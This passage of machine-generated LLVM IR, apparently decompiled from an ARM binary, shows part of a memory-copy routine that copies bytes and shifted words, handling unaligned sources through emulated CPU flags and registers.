dec_label_pc_eebc:                                ; preds = %dec_label_pc_ee08, %.thread126
  %v2_eec8 = phi i32 [ %v1_edf0, %dec_label_pc_ee08 ], [ %v2_eec8.pre, %.thread126 ]
  %v0_eec4 = phi i32 [ %v0_edf0, %dec_label_pc_ee08 ], [ %v0_eec4.pre, %.thread126 ]
  %v0_eebc = phi i32 [ %v1_ee08, %dec_label_pc_ee08 ], [ %v0_eebc.pre, %.thread126 ]
  %v1_eebc = sub i32 4, %v0_eebc
  store i32 %v1_eebc, i32* @ip, align 4
  %v1_eec0 = add i32 %v1_eebc, -2
  %v3_eec0 = sub i32 1, %v1_eebc
  %v4_eec0 = and i32 %v3_eec0, %v1_eebc
  %v5_eec0 = icmp slt i32 %v4_eec0, 0
  store i1 %v5_eec0, i1* %cpsr_v.global-to-local, align 1
  %v6_eec0 = icmp slt i32 %v1_eec0, 0
  store i1 %v6_eec0, i1* %cpsr_n.global-to-local, align 1
  %v7_eec0 = icmp eq i32 %v1_eebc, 2
  store i1 %v7_eec0, i1* %cpsr_z.global-to-local, align 1
  %v1_eec4 = inttoptr i32 %v0_eec4 to i8*
  %v2_eec4 = load i8, i8* %v1_eec4, align 1
  %v3_eec4 = zext i8 %v2_eec4 to i32
  store i32 %v3_eec4, i32* @r3, align 4
  %v5_eec4 = add i32 %v0_eec4, 1
  store i32 %v5_eec4, i32* %r1.global-to-local, align 4
  %v3_eec8 = inttoptr i32 %v2_eec8 to i8*
  store i8 %v2_eec4, i8* %v3_eec8, align 1
  %v4_eec8 = load i32, i32* %r0.global-to-local, align 4
  %v5_eec8 = add i32 %v4_eec8, 1
  store i32 %v5_eec8, i32* %r0.global-to-local, align 4
  %v0_eecc = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_eecc = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_eecc = xor i1 %v0_eecc, %v1_eecc
  br i1 %v2_eecc, label %.thread127, label %bb146

bb146:                                            ; preds = %dec_label_pc_eebc
  %v3_eecc = load i32, i32* %r1.global-to-local, align 4
  %v4_eecc = inttoptr i32 %v3_eecc to i8*
  %v5_eecc = load i8, i8* %v4_eecc, align 1
  %v6_eecc = zext i8 %v5_eecc to i32
  store i32 %v6_eecc, i32* @r3, align 4
  %v8_eecc = add i32 %v3_eecc, 1
  store i32 %v8_eecc, i32* %r1.global-to-local, align 4
  %v6_eed0 = inttoptr i32 %v5_eec8 to i8*
  store i8 %v5_eecc, i8* %v6_eed0, align 1
  %v7_eed0 = load i32, i32* %r0.global-to-local, align 4
  %v8_eed0 = add i32 %v7_eed0, 1
  store i32 %v8_eed0, i32* %r0.global-to-local, align 4
  %v1_eed4.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_eed4.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread127

.thread127:                                       ; preds = %dec_label_pc_eebc, %bb146
  %v7_eed8 = phi i32 [ %v8_eed0, %bb146 ], [ %v5_eec8, %dec_label_pc_eebc ]
  %v2_eed8 = phi i1 [ %v2_eed4.pre, %bb146 ], [ %v1_eecc, %dec_label_pc_eebc ]
  %v1_eed8 = phi i1 [ %v1_eed4.pre, %bb146 ], [ %v0_eecc, %dec_label_pc_eebc ]
  %v0_eed4 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_eed4 = xor i1 %v2_eed8, %v1_eed8
  %v4_eed4 = or i1 %v0_eed4, %v3_eed4
  br i1 %v4_eed4, label %.thread128, label %bb147

bb147:                                            ; preds = %.thread127
  %v5_eed4 = load i32, i32* %r1.global-to-local, align 4
  %v6_eed4 = inttoptr i32 %v5_eed4 to i8*
  %v7_eed4 = load i8, i8* %v6_eed4, align 1
  %v8_eed4 = zext i8 %v7_eed4 to i32
  store i32 %v8_eed4, i32* @r3, align 4
  %v10_eed4 = add i32 %v5_eed4, 1
  store i32 %v10_eed4, i32* %r1.global-to-local, align 4
  %v8_eed8 = inttoptr i32 %v7_eed8 to i8*
  store i8 %v7_eed4, i8* %v8_eed8, align 1
  %v9_eed8 = load i32, i32* %r0.global-to-local, align 4
  %v10_eed8 = add i32 %v9_eed8, 1
  store i32 %v10_eed8, i32* %r0.global-to-local, align 4
  br label %.thread128

.thread128:                                       ; preds = %.thread127, %bb147
  %v0_f00c77 = phi i32 [ %v10_eed8, %bb147 ], [ %v7_eed8, %.thread127 ]
  %v0_eedc = load i32, i32* %r2.global-to-local, align 4
  %v1_eedc = load i32, i32* @ip, align 4
  %v2_eedc = sub i32 %v0_eedc, %v1_eedc
  store i32 %v2_eedc, i32* %r2.global-to-local, align 4
  %v4_eedc = xor i32 %v1_eedc, %v0_eedc
  %v5_eedc = xor i32 %v2_eedc, %v0_eedc
  %v6_eedc = and i32 %v5_eedc, %v4_eedc
  %v7_eedc = icmp slt i32 %v6_eedc, 0
  store i1 %v7_eedc, i1* %cpsr_v.global-to-local, align 1
  %v8_eedc = icmp slt i32 %v2_eedc, 0
  store i1 %v8_eedc, i1* %cpsr_n.global-to-local, align 1
  %v9_eedc = icmp eq i32 %v0_eedc, %v1_eedc
  store i1 %v9_eedc, i1* %cpsr_z.global-to-local, align 1
  %v2_eee0 = xor i1 %v8_eedc, %v7_eedc
  br i1 %v2_eee0, label %bb141, label %dec_label_pc_eee4

dec_label_pc_eee4:                                ; preds = %.thread128
  %v0_eee4 = load i32, i32* %r1.global-to-local, align 4
  %v1_eee4 = urem i32 %v0_eee4, 4
  store i32 %v1_eee4, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_eee4 = icmp eq i32 %v1_eee4, 0
  store i1 %v2_eee4, i1* %cpsr_z.global-to-local, align 1
  %extract.t131 = trunc i32 %v0_eee4 to i2
  br i1 %v2_eee4, label %dec_label_pc_ee18, label %dec_label_pc_eeec

dec_label_pc_eeec:                                ; preds = %dec_label_pc_ee10, %dec_label_pc_eee4
  %v0_f00c76 = phi i32 [ %v1_edf0, %dec_label_pc_ee10 ], [ %v0_f00c77, %dec_label_pc_eee4 ]
  %v0_ef74 = phi i32 [ %v2_ee00, %dec_label_pc_ee10 ], [ %v2_eedc, %dec_label_pc_eee4 ]
  %v0_eef4.off0 = phi i2 [ %extract.t, %dec_label_pc_ee10 ], [ %extract.t131, %dec_label_pc_eee4 ]
  %v0_eeec = phi i32 [ %v0_edf0, %dec_label_pc_ee10 ], [ %v0_eee4, %dec_label_pc_eee4 ]
  %v1_eeec = and i32 %v0_eeec, -4
  store i32 %v1_eeec, i32* %r1.global-to-local, align 4
  %v1_eef0 = inttoptr i32 %v1_eeec to i32*
  %v2_eef0 = load i32, i32* %v1_eef0, align 4
  store i32 %v2_eef0, i32* %lr.global-to-local, align 4
  %v4_eef0 = add i32 %v1_eeec, 4
  store i32 %v4_eef0, i32* %r1.global-to-local, align 4
  %v1_ef6c = add i32 %v0_ef74, -12
  %v3_ef6c = sub i32 11, %v0_ef74
  %v4_ef6c = and i32 %v3_ef6c, %v0_ef74
  %v5_ef6c = icmp slt i32 %v4_ef6c, 0
  store i1 %v5_ef6c, i1* %cpsr_v.global-to-local, align 1
  %v6_ef6c = icmp slt i32 %v1_ef6c, 0
  store i1 %v6_ef6c, i1* %cpsr_n.global-to-local, align 1
  %v7_ef6c = icmp eq i32 %v0_ef74, 12
  store i1 %v7_ef6c, i1* %cpsr_z.global-to-local, align 1
  %v2_ef70 = xor i1 %v6_ef6c, %v5_ef6c
  switch i2 %v0_eef4.off0, label %dec_label_pc_ef00 [
    i2 -1, label %dec_label_pc_efd8
    i2 -2, label %dec_label_pc_ef6c
  ]

dec_label_pc_ef00:                                ; preds = %dec_label_pc_eeec
  br i1 %v2_ef70, label %dec_label_pc_ef4c, label %dec_label_pc_ef08

dec_label_pc_ef08:                                ; preds = %dec_label_pc_ef00
  store i32 %v1_ef6c, i32* %r2.global-to-local, align 4
  %v3_ef0c = load i32, i32* @r4, align 4
  store i32 %v3_ef0c, i32* %stack_var_-16, align 4
  %v6_ef0c = load i32, i32* @r5, align 4
  store i32 %v6_ef0c, i32* %stack_var_-12, align 4
  br label %dec_label_pc_ef10

dec_label_pc_ef10:                                ; preds = %dec_label_pc_ef10.dec_label_pc_ef10_crit_edge, %dec_label_pc_ef08
  %v0_ef34 = phi i32 [ %v12_ef34, %dec_label_pc_ef10.dec_label_pc_ef10_crit_edge ], [ %v0_f00c76, %dec_label_pc_ef08 ]
  %v0_ef14 = phi i32 [ %v0_ef14.pre, %dec_label_pc_ef10.dec_label_pc_ef10_crit_edge ], [ %v4_eef0, %dec_label_pc_ef08 ]
  %v0_ef10 = phi i32 [ %v0_ef10.pre, %dec_label_pc_ef10.dec_label_pc_ef10_crit_edge ], [ %v2_eef0, %dec_label_pc_ef08 ]
  %v3_ef10 = udiv i32 %v0_ef10, 256
  %v1_ef14 = inttoptr i32 %v0_ef14 to i32*
  %v2_ef14 = load i32, i32* %v1_ef14, align 4
  store i32 %v2_ef14, i32* %r4.global-to-local, align 4
  %v3_ef14 = add i32 %v0_ef14, 4
  %v4_ef14 = inttoptr i32 %v3_ef14 to i32*
  %v5_ef14 = load i32, i32* %v4_ef14, align 4
  store i32 %v5_ef14, i32* %r5.global-to-local, align 4
  %v6_ef14 = add i32 %v0_ef14, 8
  %v7_ef14 = inttoptr i32 %v6_ef14 to i32*
  %v8_ef14 = load i32, i32* %v7_ef14, align 4
  store i32 %v8_ef14, i32* %ip.global-to-local, align 4
  %v9_ef14 = add i32 %v0_ef14, 12
  %v10_ef14 = inttoptr i32 %v9_ef14 to i32*
  %v11_ef14 = load i32, i32* %v10_ef14, align 4
  store i32 %v11_ef14, i32* %lr.global-to-local, align 4
  %v12_ef14 = add i32 %v0_ef14, 16
  store i32 %v12_ef14, i32* %r1.global-to-local, align 4
  %v4_ef18 = mul i32 %v2_ef14, 16777216
  %v5_ef18 = or i32 %v4_ef18, %v3_ef10
  store i32 %v5_ef18, i32* @r3, align 4
  %v3_ef1c = udiv i32 %v2_ef14, 256
  %v4_ef20 = mul i32 %v5_ef14, 16777216
  %v5_ef20 = or i32 %v4_ef20, %v3_ef1c
  store i32 %v5_ef20, i32* %r4.global-to-local, align 4
  %v3_ef24 = udiv i32 %v5_ef14, 256
  %v4_ef28 = mul i32 %v8_ef14, 16777216
  %v5_ef28 = or i32 %v4_ef28, %v3_ef24
  store i32 %v5_ef28, i32* %r5.global-to-local, align 4
  %v3_ef2c = udiv i32 %v8_ef14, 256
  %v4_ef30 = mul i32 %v11_ef14, 16777216
  %v5_ef30 = or i32 %v4_ef30, %v3_ef2c
  store i32 %v5_ef30, i32* @ip, align 4
  %v1_ef34 = inttoptr i32 %v0_ef34 to i32*
  store i32 %v5_ef18, i32* %v1_ef34, align 4
  %v3_ef34 = add i32 %v0_ef34, 4
  %v4_ef34 = inttoptr i32 %v3_ef34 to i32*
  %v5_ef34 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_ef34, i32* %v4_ef34, align 4
  %v6_ef34 = add i32 %v0_ef34, 8
  %v7_ef34 = inttoptr i32 %v6_ef34 to i32*
  %v8_ef34 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_ef34, i32* %v7_ef34, align 4
  %v9_ef34 = add i32 %v0_ef34, 12
  %v10_ef34 = inttoptr i32 %v9_ef34 to i32*
  %v11_ef34 = load i32, i32* @ip, align 4
  store i32 %v11_ef34, i32* %v10_ef34, align 4
  %v12_ef34 = add i32 %v0_ef34, 16
  store i32 %v12_ef34, i32* %r0.global-to-local, align 4
  %v0_ef38 = load i32, i32* %r2.global-to-local, align 4
  %v1_ef38 = add i32 %v0_ef38, -16
  store i32 %v1_ef38, i32* %r2.global-to-local, align 4
  %v3_ef38 = sub i32 15, %v0_ef38
  %v4_ef38 = and i32 %v3_ef38, %v0_ef38
  %v5_ef38 = icmp slt i32 %v4_ef38, 0
  %v6_ef38 = icmp slt i32 %v1_ef38, 0
  %v2_ef3c = xor i1 %v6_ef38, %v5_ef38
  br i1 %v2_ef3c, label %dec_label_pc_ef40, label %dec_label_pc_ef10.dec_label_pc_ef10_crit_edge

dec_label_pc_ef10.dec_label_pc_ef10_crit_edge:    ; preds = %dec_label_pc_ef10
  %v0_ef10.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_ef14.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_ef10

dec_label_pc_ef40:                                ; preds = %dec_label_pc_ef10
  %v2_ef40 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_ef40, i32* @r4, align 4
  %v5_ef40 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_ef40, i32* @r5, align 4
  %v1_ef44 = add i32 %v0_ef38, -4
  store i32 %v1_ef44, i32* %r2.global-to-local, align 4
  %v3_ef44 = add i32 %v0_ef38, 2147483632
  %v4_ef44 = and i32 %v1_ef44, %v3_ef44
  %v5_ef44 = icmp slt i32 %v4_ef44, 0
  store i1 %v5_ef44, i1* %cpsr_v.global-to-local, align 1
  %v6_ef44 = icmp slt i32 %v1_ef44, 0
  store i1 %v6_ef44, i1* %cpsr_n.global-to-local, align 1
  %v7_ef44 = icmp eq i32 %v1_ef44, 0
  store i1 %v7_ef44, i1* %cpsr_z.global-to-local, align 1
  %v2_ef48 = xor i1 %v6_ef44, %v5_ef44
  br i1 %v2_ef48, label %dec_label_pc_ef64, label %dec_label_pc_ef4c

dec_label_pc_ef4c:                                ; preds = %dec_label_pc_ef40, %dec_label_pc_ef00, %dec_label_pc_ef4c
  %v1_ef58 = phi i32 [ %v4_ef58, %dec_label_pc_ef4c ], [ %v12_ef34, %dec_label_pc_ef40 ], [ %v0_f00c76, %dec_label_pc_ef00 ]
  %v0_ef4c = load i32, i32* %lr.global-to-local, align 4
  %v3_ef4c = udiv i32 %v0_ef4c, 256
  store i32 %v3_ef4c, i32* %ip.global-to-local, align 4
  %v0_ef50 = load i32, i32* %r1.global-to-local, align 4
  %v1_ef50 = inttoptr i32 %v0_ef50 to i32*
  %v2_ef50 = load i32, i32* %v1_ef50, align 4
  store i32 %v2_ef50, i32* %lr.global-to-local, align 4
  %v4_ef50 = add i32 %v0_ef50, 4
  store i32 %v4_ef50, i32* %r1.global-to-local, align 4
  %v4_ef54 = mul i32 %v2_ef50, 16777216
  %v5_ef54 = or i32 %v4_ef54, %v3_ef4c
  store i32 %v5_ef54, i32* @ip, align 4
  %v2_ef58 = inttoptr i32 %v1_ef58 to i32*
  store i32 %v5_ef54, i32* %v2_ef58, align 4
  %v3_ef58 = load i32, i32* %r0.global-to-local, align 4
  %v4_ef58 = add i32 %v3_ef58, 4
  store i32 %v4_ef58, i32* %r0.global-to-local, align 4
  %v0_ef5c = load i32, i32* %r2.global-to-local, align 4
  %v1_ef5c = add i32 %v0_ef5c, -4
  store i32 %v1_ef5c, i32* %r2.global-to-local, align 4
  %v3_ef5c = sub i32 3, %v0_ef5c
  %v4_ef5c = and i32 %v3_ef5c, %v0_ef5c
  %v5_ef5c = icmp slt i32 %v4_ef5c, 0
  %v6_ef5c = icmp slt i32 %v1_ef5c, 0
  %v2_ef60 = xor i1 %v6_ef5c, %v5_ef5c
  br i1 %v2_ef60, label %dec_label_pc_ef64.loopexit, label %dec_label_pc_ef4c

dec_label_pc_ef64.loopexit:                       ; preds = %dec_label_pc_ef4c
  %v7_ef5c = icmp eq i32 %v0_ef5c, 4
  store i1 %v5_ef5c, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_ef5c, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_ef5c, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ef64

dec_label_pc_ef64:                                ; preds = %dec_label_pc_ef64.loopexit, %dec_label_pc_ef40
  %v0_ee8c59 = phi i32 [ %v1_ef5c, %dec_label_pc_ef64.loopexit ], [ %v1_ef44, %dec_label_pc_ef40 ]
  %v0_ef64 = load i32, i32* %r1.global-to-local, align 4
  %v1_ef64 = add i32 %v0_ef64, -3
  store i32 %v1_ef64, i32* %r1.global-to-local, align 4
  br label %bb141

dec_label_pc_ef6c:                                ; preds = %dec_label_pc_eeec
  br i1 %v2_ef70, label %dec_label_pc_efb8, label %dec_label_pc_ef74

dec_label_pc_ef74:                                ; preds = %dec_label_pc_ef6c
  store i32 %v1_ef6c, i32* %r2.global-to-local, align 4
  %v3_ef78 = load i32, i32* @r4, align 4
  store i32 %v3_ef78, i32* %stack_var_-16, align 4
  %v6_ef78 = load i32, i32* @r5, align 4
  store i32 %v6_ef78, i32* %stack_var_-12, align 4
  br label %dec_label_pc_ef7c

dec_label_pc_ef7c:                                ; preds = %dec_label_pc_ef7c.dec_label_pc_ef7c_crit_edge, %dec_label_pc_ef74
  %v0_efa0 = phi i32 [ %v12_efa0, %dec_label_pc_ef7c.dec_label_pc_ef7c_crit_edge ], [ %v0_f00c76, %dec_label_pc_ef74 ]
  %v0_ef80 = phi i32 [ %v0_ef80.pre, %dec_label_pc_ef7c.dec_label_pc_ef7c_crit_edge ], [ %v4_eef0, %dec_label_pc_ef74 ]
  %v0_ef7c = phi i32 [ %v0_ef7c.pre, %dec_label_pc_ef7c.dec_label_pc_ef7c_crit_edge ], [ %v2_eef0, %dec_label_pc_ef74 ]
  %v3_ef7c = udiv i32 %v0_ef7c, 65536
  %v1_ef80 = inttoptr i32 %v0_ef80 to i32*
  %v2_ef80 = load i32, i32* %v1_ef80, align 4
  store i32 %v2_ef80, i32* %r4.global-to-local, align 4
  %v3_ef80 = add i32 %v0_ef80, 4
  %v4_ef80 = inttoptr i32 %v3_ef80 to i32*
  %v5_ef80 = load i32, i32* %v4_ef80, align 4
  store i32 %v5_ef80, i32* %r5.global-to-local, align 4
  %v6_ef80 = add i32 %v0_ef80, 8
  %v7_ef80 = inttoptr i32 %v6_ef80 to i32*
  %v8_ef80 = load i32, i32* %v7_ef80, align 4
  store i32 %v8_ef80, i32* %ip.global-to-local, align 4
  %v9_ef80 = add i32 %v0_ef80, 12
  %v10_ef80 = inttoptr i32 %v9_ef80 to i32*
  %v11_ef80 = load i32, i32* %v10_ef80, align 4
  store i32 %v11_ef80, i32* %lr.global-to-local, align 4
  %v12_ef80 = add i32 %v0_ef80, 16
  store i32 %v12_ef80, i32* %r1.global-to-local, align 4
  %v4_ef84 = mul i32 %v2_ef80, 65536
  %v5_ef84 = or i32 %v4_ef84, %v3_ef7c
  store i32 %v5_ef84, i32* @r3, align 4
  %v3_ef88 = udiv i32 %v2_ef80, 65536
  %v4_ef8c = mul i32 %v5_ef80, 65536
  %v5_ef8c = or i32 %v4_ef8c, %v3_ef88
  store i32 %v5_ef8c, i32* %r4.global-to-local, align 4
  %v3_ef90 = udiv i32 %v5_ef80, 65536
  %v4_ef94 = mul i32 %v8_ef80, 65536
  %v5_ef94 = or i32 %v4_ef94, %v3_ef90
  store i32 %v5_ef94, i32* %r5.global-to-local, align 4
  %v3_ef98 = udiv i32 %v8_ef80, 65536
  %v4_ef9c = mul i32 %v11_ef80, 65536
  %v5_ef9c = or i32 %v4_ef9c, %v3_ef98
  store i32 %v5_ef9c, i32* @ip, align 4
  %v1_efa0 = inttoptr i32 %v0_efa0 to i32*
  store i32 %v5_ef84, i32* %v1_efa0, align 4
  %v3_efa0 = add i32 %v0_efa0, 4
  %v4_efa0 = inttoptr i32 %v3_efa0 to i32*
  %v5_efa0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_efa0, i32* %v4_efa0, align 4
  %v6_efa0 = add i32 %v0_efa0, 8
  %v7_efa0 = inttoptr i32 %v6_efa0 to i32*
  %v8_efa0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_efa0, i32* %v7_efa0, align 4
  %v9_efa0 = add i32 %v0_efa0, 12
  %v10_efa0 = inttoptr i32 %v9_efa0 to i32*
  %v11_efa0 = load i32, i32* @ip, align 4
  store i32 %v11_efa0, i32* %v10_efa0, align 4
  %v12_efa0 = add i32 %v0_efa0, 16
  store i32 %v12_efa0, i32* %r0.global-to-local, align 4
  %v0_efa4 = load i32, i32* %r2.global-to-local, align 4
  %v1_efa4 = add i32 %v0_efa4, -16
  store i32 %v1_efa4, i32* %r2.global-to-local, align 4
  %v3_efa4 = sub i32 15, %v0_efa4
  %v4_efa4 = and i32 %v3_efa4, %v0_efa4
  %v5_efa4 = icmp slt i32 %v4_efa4, 0
  %v6_efa4 = icmp slt i32 %v1_efa4, 0
  %v2_efa8 = xor i1 %v6_efa4, %v5_efa4
  br i1 %v2_efa8, label %dec_label_pc_efac, label %dec_label_pc_ef7c.dec_label_pc_ef7c_crit_edge

dec_label_pc_ef7c.dec_label_pc_ef7c_crit_edge:    ; preds = %dec_label_pc_ef7c
  %v0_ef7c.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_ef80.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_ef7c

dec_label_pc_efac:                                ; preds = %dec_label_pc_ef7c
  %v2_efac = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_efac, i32* @r4, align 4
  %v5_efac = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_efac, i32* @r5, align 4
  %v1_efb0 = add i32 %v0_efa4, -4
  store i32 %v1_efb0, i32* %r2.global-to-local, align 4
  %v3_efb0 = add i32 %v0_efa4, 2147483632
  %v4_efb0 = and i32 %v1_efb0, %v3_efb0
  %v5_efb0 = icmp slt i32 %v4_efb0, 0
  store i1 %v5_efb0, i1* %cpsr_v.global-to-local, align 1
  %v6_efb0 = icmp slt i32 %v1_efb0, 0
  store i1 %v6_efb0, i1* %cpsr_n.global-to-local, align 1
  %v7_efb0 = icmp eq i32 %v1_efb0, 0
  store i1 %v7_efb0, i1* %cpsr_z.global-to-local, align 1
  %v2_efb4 = xor i1 %v6_efb0, %v5_efb0
  br i1 %v2_efb4, label %dec_label_pc_efd0, label %dec_label_pc_efb8

dec_label_pc_efb8:                                ; preds = %dec_label_pc_efac, %dec_label_pc_ef6c, %dec_label_pc_efb8
  %v1_efc4 = phi i32 [ %v4_efc4, %dec_label_pc_efb8 ], [ %v12_efa0, %dec_label_pc_efac ], [ %v0_f00c76, %dec_label_pc_ef6c ]
  %v0_efb8 = load i32, i32* %lr.global-to-local, align 4
  %v3_efb8 = udiv i32 %v0_efb8, 65536
  store i32 %v3_efb8, i32* %ip.global-to-local, align 4
  %v0_efbc = load i32, i32* %r1.global-to-local, align 4
  %v1_efbc = inttoptr i32 %v0_efbc to i32*
  %v2_efbc = load i32, i32* %v1_efbc, align 4
  store i32 %v2_efbc, i32* %lr.global-to-local, align 4
  %v4_efbc = add i32 %v0_efbc, 4
  store i32 %v4_efbc, i32* %r1.global-to-local, align 4
  %v4_efc0 = mul i32 %v2_efbc, 65536
  %v5_efc0 = or i32 %v4_efc0, %v3_efb8
  store i32 %v5_efc0, i32* @ip, align 4
  %v2_efc4 = inttoptr i32 %v1_efc4 to i32*
  store i32 %v5_efc0, i32* %v2_efc4, align 4
  %v3_efc4 = load i32, i32* %r0.global-to-local, align 4
  %v4_efc4 = add i32 %v3_efc4, 4
  store i32 %v4_efc4, i32* %r0.global-to-local, align 4
  %v0_efc8 = load i32, i32* %r2.global-to-local, align 4
  %v1_efc8 = add i32 %v0_efc8, -4
  store i32 %v1_efc8, i32* %r2.global-to-local, align 4
  %v3_efc8 = sub i32 3, %v0_efc8
  %v4_efc8 = and i32 %v3_efc8, %v0_efc8
  %v5_efc8 = icmp slt i32 %v4_efc8, 0
  %v6_efc8 = icmp slt i32 %v1_efc8, 0
  %v2_efcc = xor i1 %v6_efc8, %v5_efc8
  br i1 %v2_efcc, label %dec_label_pc_efd0.loopexit, label %dec_label_pc_efb8

dec_label_pc_efd0.loopexit:                       ; preds = %dec_label_pc_efb8
  %v7_efc8 = icmp eq i32 %v0_efc8, 4
  store i1 %v5_efc8, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_efc8, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_efc8, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_efd0

dec_label_pc_efd0:                                ; preds = %dec_label_pc_efd0.loopexit, %dec_label_pc_efac
  %v0_ee8c60 = phi i32 [ %v1_efc8, %dec_label_pc_efd0.loopexit ], [ %v1_efb0, %dec_label_pc_efac ]
  %v0_efd0 = load i32, i32* %r1.global-to-local, align 4
  %v1_efd0 = add i32 %v0_efd0, -2
  store i32 %v1_efd0, i32* %r1.global-to-local, align 4
  br label %bb141

dec_label_pc_efd8:                                ; preds = %dec_label_pc_eeec
  br i1 %v2_ef70, label %dec_label_pc_f024, label %dec_label_pc_efe0

dec_label_pc_efe0:                                ; preds = %dec_label_pc_efd8
  store i32 %v1_ef6c, i32* %r2.global-to-local, align 4
  %v3_efe4 = load i32, i32* @r4, align 4
  store i32 %v3_efe4, i32* %stack_var_-16, align 4
  %v6_efe4 = load i32, i32* @r5, align 4
  store i32 %v6_efe4, i32* %stack_var_-12, align 4
  br label %dec_label_pc_efe8

dec_label_pc_efe8:                                ; preds = %dec_label_pc_efe8.dec_label_pc_efe8_crit_edge, %dec_label_pc_efe0
  %v0_f00c = phi i32 [ %v12_f00c, %dec_label_pc_efe8.dec_label_pc_efe8_crit_edge ], [ %v0_f00c76, %dec_label_pc_efe0 ]
  %v0_efec = phi i32 [ %v0_efec.pre, %dec_label_pc_efe8.dec_label_pc_efe8_crit_edge ], [ %v4_eef0, %dec_label_pc_efe0 ]
  %v0_efe8 = phi i32 [ %v0_efe8.pre, %dec_label_pc_efe8.dec_label_pc_efe8_crit_edge ], [ %v2_eef0, %dec_label_pc_efe0 ]
  %v3_efe8 = udiv i32 %v0_efe8, 16777216
  %v1_efec = inttoptr i32 %v0_efec to i32*
  %v2_efec = load i32, i32* %v1_efec, align 4
  store i32 %v2_efec, i32* %r4.global-to-local, align 4
  %v3_efec = add i32 %v0_efec, 4
  %v4_efec = inttoptr i32 %v3_efec to i32*
  %v5_efec = load i32, i32* %v4_efec, align 4
  store i32 %v5_efec, i32* %r5.global-to-local, align 4
  %v6_efec = add i32 %v0_efec, 8
  %v7_efec = inttoptr i32 %v6_efec to i32*
  %v8_efec = load i32, i32* %v7_efec, align 4
  store i32 %v8_efec, i32* %ip.global-to-local, align 4
  %v9_efec = add i32 %v0_efec, 12
  %v10_efec = inttoptr i32 %v9_efec to i32*
  %v11_efec = load i32, i32* %v10_efec, align 4
  store i32 %v11_efec, i32* %lr.global-to-local, align 4
  %v12_efec = add i32 %v0_efec, 16
  store i32 %v12_efec, i32* %r1.global-to-local, align 4
  %v4_eff0 = mul i32 %v2_efec, 256
  %v5_eff0 = or i32 %v4_eff0, %v3_efe8
  store i32 %v5_eff0, i32* @r3, align 4
  %v3_eff4 = udiv i32 %v2_efec, 16777216
  %v4_eff8 = mul i32 %v5_efec, 256
  %v5_eff8 = or i32 %v4_eff8, %v3_eff4
  store i32 %v5_eff8, i32* %r4.global-to-local, align 4
  %v3_effc = udiv i32 %v5_efec, 16777216
  %v4_f000 = mul i32 %v8_efec, 256
  %v5_f000 = or i32 %v4_f000, %v3_effc
  store i32 %v5_f000, i32* %r5.global-to-local, align 4
  %v3_f004 = udiv i32 %v8_efec, 16777216
  %v4_f008 = mul i32 %v11_efec, 256
  %v5_f008 = or i32 %v4_f008, %v3_f004
  store i32 %v5_f008, i32* @ip, align 4
  %v1_f00c = inttoptr i32 %v0_f00c to i32*
  store i32 %v5_eff0, i32* %v1_f00c, align 4
  %v3_f00c = add i32 %v0_f00c, 4
  %v4_f00c = inttoptr i32 %v3_f00c to i32*
  %v5_f00c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_f00c, i32* %v4_f00c, align 4
  %v6_f00c = add i32 %v0_f00c, 8
  %v7_f00c = inttoptr i32 %v6_f00c to i32*
  %v8_f00c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_f00c, i32* %v7_f00c, align 4
  %v9_f00c = add i32 %v0_f00c, 12
  %v10_f00c = inttoptr i32 %v9_f00c to i32*
  %v11_f00c = load i32, i32* @ip, align 4
  store i32 %v11_f00c, i32* %v10_f00c, align 4
  %v12_f00c = add i32 %v0_f00c, 16
  store i32 %v12_f00c, i32* %r0.global-to-local, align 4
  %v0_f010 = load i32, i32* %r2.global-to-local, align 4
  %v1_f010 = add i32 %v0_f010, -16
  store i32 %v1_f010, i32* %r2.global-to-local, align 4
  %v3_f010 = sub i32 15, %v0_f010
  %v4_f010 = and i32 %v3_f010, %v0_f010
  %v5_f010 = icmp slt i32 %v4_f010, 0
  %v6_f010 = icmp slt i32 %v1_f010, 0
  %v2_f014 = xor i1 %v6_f010, %v5_f010
  br i1 %v2_f014, label %dec_label_pc_f018, label %dec_label_pc_efe8.dec_label_pc_efe8_crit_edge

dec_label_pc_efe8.dec_label_pc_efe8_crit_edge:    ; preds = %dec_label_pc_efe8
  %v0_efe8.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_efec.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_efe8

dec_label_pc_f018:                                ; preds = %dec_label_pc_efe8
  %v2_f018 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_f018, i32* @r4, align 4
  %v5_f018 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_f018, i32* @r5, align 4
  %v1_f01c = add i32 %v0_f010, -4
  store i32 %v1_f01c, i32* %r2.global-to-local, align 4
  %v3_f01c = add i32 %v0_f010, 2147483632
  %v4_f01c = and i32 %v1_f01c, %v3_f01c
  %v5_f01c = icmp slt i32 %v4_f01c, 0
  store i1 %v5_f01c, i1* %cpsr_v.global-to-local, align 1
  %v6_f01c = icmp slt i32 %v1_f01c, 0
  store i1 %v6_f01c, i1* %cpsr_n.global-to-local, align 1
  %v7_f01c = icmp eq i32 %v1_f01c, 0
